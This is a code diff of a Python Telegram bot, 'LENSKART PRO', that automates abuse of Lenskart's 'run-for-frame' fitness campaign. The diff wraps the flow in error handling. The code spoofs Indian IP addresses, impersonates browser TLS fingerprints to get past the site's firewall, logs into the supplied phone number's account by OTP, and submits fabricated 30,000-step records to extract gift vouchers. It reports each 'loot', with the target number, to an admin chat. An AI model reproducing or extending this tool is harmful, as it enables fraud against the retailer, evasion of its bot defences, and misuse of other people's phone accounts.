@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-LENSKART PRO - TELEGRAM CLOUD BOT (Railway Ready V5.1 - WAF Bypass & Error Logging)
-Features: Daily Limits, 5 Referrals for 30m VIP, God Mode Admin, Indian IP Spoofing, UI Buttons, Robust Error Handling
+LENSKART PRO - TELEGRAM CLOUD BOT (Railway Final Build V5.2)
+Features: Daily Limits, 5 Referrals for 30m VIP, God Mode Admin, Indian IP Spoofing, UI Buttons, Crash-Proof Error Handling
 """
 
 import telebot
@@ -163,8 +163,8 @@ class LenskartFakeDevice:
         self.build_version = f"TP1A.220905.00{random.randint(1,9)}"
         self.session_token = None
         
-        # Upgraded TLS Impersonation (chrome116)
-        self.s = requests.Session(impersonate="chrome116")
+        # 🚨 FIXED: Reverted to chrome110 for Railway compatibility
+        self.s = requests.Session(impersonate="chrome110")
         self.fake_ip = generate_indian_ip()
         self.x_assertion = self.generate_x_assertion()
         
@@ -211,7 +211,6 @@ class LenskartFakeDevice:
             else: 
                 return self.s.get(url, headers=self.base_headers(), timeout=20)
         except Exception as e:
-            # Custom mock response to ensure error is passed to the bot UI
             class FakeResponse:
                 status_code = 500
                 text = f"Exception: {str(e)}"
@@ -331,33 +330,39 @@ def process_steps(message):
             return
             
         msg = bot.send_message(chat_id, "⏳ <i>Injecting Stealth IPs & Bypassing WAF...</i>", parse_mode="HTML")
-        device = LenskartFakeDevice(text)
         
-        r = device.req("POST", "/v2/sessions", {})
-        
-        # 🚨 ROBUST ERROR HANDLING ADDED HERE
-        if not r or r.status_code != 200:
-            error_details = r.text[:200] if hasattr(r, 'text') else "No response from server"
-            status_code = r.status_code if hasattr(r, 'status_code') else 'N/A'
+        # 🚨 GLOBAL TRY-EXCEPT BLOCK PREVENTS ANY SILENT HANGS
+        try:
+            device = LenskartFakeDevice(text)
+            r = device.req("POST", "/v2/sessions", {})
             
-            error_msg = (
-                f"❌ <b>Lenskart Server Blocked.</b>\n\n"
-                f"⚠️ <b>Status Code:</b> {status_code}\n"
-                f"🛠 <b>WAF Response:</b> <code>{error_details}</code>"
-            )
-            bot.edit_message_text(error_msg, chat_id, msg.message_id, parse_mode="HTML")
-            del user_sessions[chat_id]
-            return
+            if not r or r.status_code != 200:
+                error_details = r.text[:200] if hasattr(r, 'text') else "No response from server"
+                status_code = r.status_code if hasattr(r, 'status_code') else 'N/A'
+                
+                error_msg = (
+                    f"❌ <b>Lenskart Server Blocked.</b>\n\n"
+                    f"⚠️ <b>Status Code:</b> {status_code}\n"
+                    f"🛠 <b>WAF Response:</b> <code>{error_details}</code>"
+                )
+                bot.edit_message_text(error_msg, chat_id, msg.message_id, parse_mode="HTML")
+                del user_sessions[chat_id]
+                return
+                
+            device.session_token = r.json().get("result", {}).get("id")
+            r = device.req("POST", "/v3/customers/sendOtp", {"phoneCode": "+91", "telephone": device.phone})
             
-        device.session_token = r.json().get("result", {}).get("id")
-        r = device.req("POST", "/v3/customers/sendOtp", {"phoneCode": "+91", "telephone": device.phone})
-        
-        if r and r.status_code == 200:
-            user_sessions[chat_id] = {"step": "wait_for_otp", "device": device}
-            bot.edit_message_text(f"✅ OTP sent to {text} using IP {device.fake_ip}!\n\n🔑 <b>Please enter the OTP:</b>", chat_id, msg.message_id, parse_mode="HTML")
-        else:
-            bot.edit_message_text(f"❌ Failed to send OTP. Status: {r.status_code if hasattr(r, 'status_code') else 'N/A'}", chat_id, msg.message_id)
-            del user_sessions[chat_id]
+            if r and r.status_code == 200:
+                user_sessions[chat_id] = {"step": "wait_for_otp", "device": device}
+                bot.edit_message_text(f"✅ OTP sent to {text} using IP {device.fake_ip}!\n\n🔑 <b>Please enter the OTP:</b>", chat_id, msg.message_id, parse_mode="HTML")
+            else:
+                bot.edit_message_text(f"❌ Failed to send OTP. Status: {r.status_code if hasattr(r, 'status_code') else 'N/A'}", chat_id, msg.message_id)
+                del user_sessions[chat_id]
+                
+        except Exception as e:
+            bot.edit_message_text(f"❌ <b>System Error / Crash:</b>\n<code>{str(e)}</code>", chat_id, msg.message_id, parse_mode="HTML")
+            if chat_id in user_sessions:
+                del user_sessions[chat_id]
             
     # OTP SUBMITTED
     elif step == "wait_for_otp":
@@ -369,46 +374,52 @@ def process_steps(message):
         phone = device.phone
         msg = bot.send_message(chat_id, "⏳ <i>Verifying OTP & Hacking 30,000 Steps...</i>", parse_mode="HTML")
         
-        r = device.req("POST", "/v2/customers/authenticate/mobile", {"code": text, "phoneCode": "+91", "telephone": device.phone})
-        if not r or r.status_code != 200:
-            err_text = r.text[:100] if hasattr(r, 'text') else "Unknown"
-            bot.edit_message_text(f"❌ Incorrect OTP or Blocked!\nError: <code>{err_text}</code>", chat_id, msg.message_id, parse_mode="HTML")
-            del user_sessions[chat_id]
-            return
+        try:
+            r = device.req("POST", "/v2/customers/authenticate/mobile", {"code": text, "phoneCode": "+91", "telephone": device.phone})
+            if not r or r.status_code != 200:
+                err_text = r.text[:100] if hasattr(r, 'text') else "Unknown"
+                bot.edit_message_text(f"❌ Incorrect OTP or Blocked!\nError: <code>{err_text}</code>", chat_id, msg.message_id, parse_mode="HTML")
+                del user_sessions[chat_id]
+                return
+                
+            res = r.json().get("result", {})
+            device.session_token = res.get("token")
             
-        res = r.json().get("result", {})
-        device.session_token = res.get("token")
-        
-        today_midnight = int(time.time() * 1000) - (int(time.time() * 1000) % 86400000) - (5.5 * 3600 * 1000)
-        payload = [{"distance": 0.0, "steps": 0 if i < 6 else 30000, "timestamp": int(today_midnight - (6-i) * 86400000)} for i in range(7)]
-        
-        r = device.req("POST", "/v2/customers/bff/campaign/eligibility?campaignName=run-for-frame", payload)
-        
-        if r and r.status_code == 200:
-            data = r.json().get("result", {})
-            if data.get("giftVoucher"):
-                voucher = data.get("giftVoucher")
-                tier = data.get("tier", "Tier_3")
-                
-                record_usage(user_id)
-                update_score(user_id, message.from_user.first_name)
-                
-                success_msg = f"🎉 <b>COUPON EXTRACTED SUCCESSFULLY!</b> 🎉\n\n📱 <b>Number:</b> <code>{phone}</code>\n🏆 <b>Tier:</b> {tier}\n🎫 <b>Voucher Code:</b> <code>{voucher}</code>\n\n<i>Hit /start to claim more!</i>"
-                bot.edit_message_text(success_msg, chat_id, msg.message_id, parse_mode="HTML")
-                
-                admin_msg = f"🚨 <b>NEW LOOT</b> 🚨\n👤 <b>By:</b> {message.from_user.first_name} (@{message.from_user.username})\n📱 <b>Target:</b> <code>{phone}</code>\n🎫 <b>Voucher:</b> <code>{voucher}</code>\n🛡️ <b>Spoofed IP:</b> <i>{device.fake_ip}</i>"
-                try: bot.send_message(ADMIN_CHAT_ID, admin_msg, parse_mode="HTML")
-                except: pass
+            today_midnight = int(time.time() * 1000) - (int(time.time() * 1000) % 86400000) - (5.5 * 3600 * 1000)
+            payload = [{"distance": 0.0, "steps": 0 if i < 6 else 30000, "timestamp": int(today_midnight - (6-i) * 86400000)} for i in range(7)]
+            
+            r = device.req("POST", "/v2/customers/bff/campaign/eligibility?campaignName=run-for-frame", payload)
+            
+            if r and r.status_code == 200:
+                data = r.json().get("result", {})
+                if data.get("giftVoucher"):
+                    voucher = data.get("giftVoucher")
+                    tier = data.get("tier", "Tier_3")
+                    
+                    record_usage(user_id)
+                    update_score(user_id, message.from_user.first_name)
+                    
+                    success_msg = f"🎉 <b>COUPON EXTRACTED SUCCESSFULLY!</b> 🎉\n\n📱 <b>Number:</b> <code>{phone}</code>\n🏆 <b>Tier:</b> {tier}\n🎫 <b>Voucher Code:</b> <code>{voucher}</code>\n\n<i>Hit /start to claim more!</i>"
+                    bot.edit_message_text(success_msg, chat_id, msg.message_id, parse_mode="HTML")
+                    
+                    admin_msg = f"🚨 <b>NEW LOOT</b> 🚨\n👤 <b>By:</b> {message.from_user.first_name} (@{message.from_user.username})\n📱 <b>Target:</b> <code>{phone}</code>\n🎫 <b>Voucher:</b> <code>{voucher}</code>\n🛡️ <b>Spoofed IP:</b> <i>{device.fake_ip}</i>"
+                    try: bot.send_message(ADMIN_CHAT_ID, admin_msg, parse_mode="HTML")
+                    except: pass
+                else:
+                    bot.edit_message_text(f"⚠️ {data.get('message', 'No reward')}", chat_id, msg.message_id)
             else:
-                bot.edit_message_text(f"⚠️ {data.get('message', 'No reward')}", chat_id, msg.message_id)
-        else:
-            bot.edit_message_text("❌ Error claiming reward.", chat_id, msg.message_id)
+                bot.edit_message_text("❌ Error claiming reward.", chat_id, msg.message_id)
+                
+        except Exception as e:
+            bot.edit_message_text(f"❌ <b>Error:</b>\n<code>{str(e)}</code>", chat_id, msg.message_id, parse_mode="HTML")
             
-        del user_sessions[chat_id]
+        finally:
+            if chat_id in user_sessions:
+                del user_sessions[chat_id]
 
 if __name__ == "__main__":
     print("="*50)
-    print("🤖 STARTING V5.1 ULTIMATE CLOUD BOT...")
+    print("🤖 STARTING V5.2 FINAL BUILD...")
     print("="*50)
     try: bot.remove_webhook()
     except: pass
